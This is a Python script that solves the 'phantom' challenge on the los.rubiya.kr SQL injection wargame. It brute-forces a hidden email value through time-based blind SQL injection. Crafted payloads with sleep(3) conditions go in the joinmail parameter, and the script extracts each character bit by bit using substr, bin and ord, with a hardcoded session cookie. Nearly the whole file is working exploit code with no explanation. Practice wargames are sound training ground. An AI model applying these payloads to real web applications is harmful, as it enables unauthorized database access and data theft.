#!/usr/bin/python
#-*-coding:utf-8  -*-

#length = 32
#hex(pw) length = 64
#pw = 32 ascii words 
#Blind SQL Injection 문자 찾기!!
import urllib,urllib2,requests,time

tf = "01"
password=""
guestword=""
heex = "0123456789abcdef"
letter = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()-_=+"
'''
for k in range(1,100):
	start = time.time()
	url="https://los.rubiya.kr/chall/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php?joinmail=1%27%20and%20if((select%20no%20from%20prob_phantom%20a%20where%20no=1%20and%20ip=%27127.0.0.1%27%20and%20length(email)="+str(k)+"),sleep(3),0));%23"
	#print url
	r = requests.post(url,cookies=(dict(PHPSESSID="ijf3tme4tgms1tmi5pou50irs9")))
	end = time.time()
	print end-start
	print "Finding length of password : "+str(k)
	
	if end-start>3 :
		print "length is : " + str(k)
		length = k
		break
'''
k=28

for j in range(1,k+1):
	binpassword = ""
	for six in range(1,9):
		for i in tf:
			start = time.time()
			url="https://los.rubiya.kr/chall/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php?joinmail=1%27%20and%20if((select%20no%20from%20prob_phantom%20a%20where%20no=1%20and%20ip=%27127.0.0.1%27%20and%20substr(lpad(bin(ord(substr(email,"+str(j)+",1))),8,0),"+str(six)+",1)="+str(i)+"),sleep(3),0));%23"
			#print url
			r = requests.post(url,cookies=(dict(PHPSESSID="ijf3tme4tgms1tmi5pou50irs9")))
			end = time.time()
			#print "Finding " + str(j) +"th password's letter : " +str(i)
	
			if end-start>3 :
				binpassword += str(i)
				print "password found :" + binpassword
				break
	print "A bit word is " + binpassword
	print "ascii of this is " + chr(int('0b'+binpassword,2))
	password += chr(int('0b'+binpassword,2))
	print "Email is " + password

